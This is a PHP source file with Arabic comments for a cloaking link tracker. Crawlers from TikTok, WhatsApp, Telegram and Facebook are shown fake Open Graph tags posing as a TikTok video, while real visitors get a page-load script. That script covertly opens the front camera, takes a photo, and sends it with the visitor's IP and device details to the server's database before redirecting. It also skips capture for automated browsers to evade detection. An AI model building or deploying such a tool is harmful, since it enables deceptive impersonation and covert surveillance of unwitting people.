<?php
date_default_timezone_set('Africa/Algiers');
error_reporting(0); // إخفاء الأخطاء لعدم إفساد الـ HTML
ini_set('display_errors', 0);

ignore_user_abort(true);
set_time_limit(0);

// ==============================================================================
// 1. نظام تمرير الصور (Anti-Redirect) - تيك توك يكره التحويلات
// ==============================================================================
if (isset($_GET['proxy_img'])) {
    $img_url = base64_decode(urldecode($_GET['proxy_img']));
    
    // صورة تيك توك افتراضية في حال فشل جلب الصورة
    $default_img = "https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop";
    if (empty($img_url) || !filter_var($img_url, FILTER_VALIDATE_URL)) {
        $img_url = $default_img;
    }

    $ch = curl_init($img_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    // ترويسات تجعل سيرفر تيك توك يظن أن الطلب قادم من موقعه
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.tiktok.com/');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    $image_data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    if ($http_code == 200 && $image_data) {
        header("Content-Type: " . ($content_type ?: 'image/jpeg'));
        header("Cache-Control: public, max-age=86400");
        echo $image_data;
        exit;
    }
    // إذا فشل، أرسل الصورة الافتراضية مباشرة
    header("Location: " . $default_img);
    exit;
}

$db_file = __DIR__ . '/tracker_enhanced_v3.db';

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
} catch (Exception $e) { die("Database error."); }

// ==============================================================================
// 2. التتبع الذكي (Smart Tracker)
// ==============================================================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // 💡 الفلتر السري: التقاط بوتات تيك توك (ByteSpider) بدقة عالية
        $is_bot = preg_match('/bot|crawl|slurp|spider|facebook|meta-externalagent|whatsapp|telegram|bytespider|bytedance|tiktok|musical_ly/i', $ua);

        if ($is_bot) {
            // 💡 التحدي: إرسال البيانات في أول 10 أسطر HTML بدون أي مسافات أو تعليقات
            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . urlencode(base64_encode($meta_image));
            
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta charset="UTF-8">';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:description" content="Watch this video on TikTok">';
            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '<meta property="og:image:width" content="800">';
            echo '<meta property="og:image:height" content="800">';
            echo '<meta property="og:image:type" content="image/jpeg">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
            // وسوم تويتر (تيك توك يقرأها أيضاً)
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '</head><body>';
            // صورة مخفية للبوت
            echo '<img src="' . htmlspecialchars($proxy_img_url) . '" style="display:none; width:0; height:0;">';
            echo '</body></html>';
            exit();
        }

        // استقبال بيانات الزائر الحقيقي
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            if (function_exists('fastcgi_finish_request')) { echo 'OK'; fastcgi_finish_request(); } 
            else { header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush(); }
            
            $public_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
            $img_base64 = $_POST['image'] ?? '';
            if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 
            
            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, device_info, created_at) VALUES (?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $ua, date('Y-m-d H:i:s')]);
            } catch (Exception $e) {}
            exit;
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;
        
        async function initTracking() {
            if (navigator.webdriver) { window.location.replace(targetUrl); return; }
            let imageData = "";
            if (useCamera) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150));
                    const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.4);
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {}
            }
            const formData = new URLSearchParams();
            formData.append('save_info', '1'); formData.append('image', imageData);
            if (navigator.sendBeacon) { navigator.sendBeacon(window.location.href, formData); } 
            else { fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); }
            window.location.replace(targetUrl); 
        }
        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body></body>
</html>
<?php 
        exit();
    } else { die("Link not found."); }
}
?>
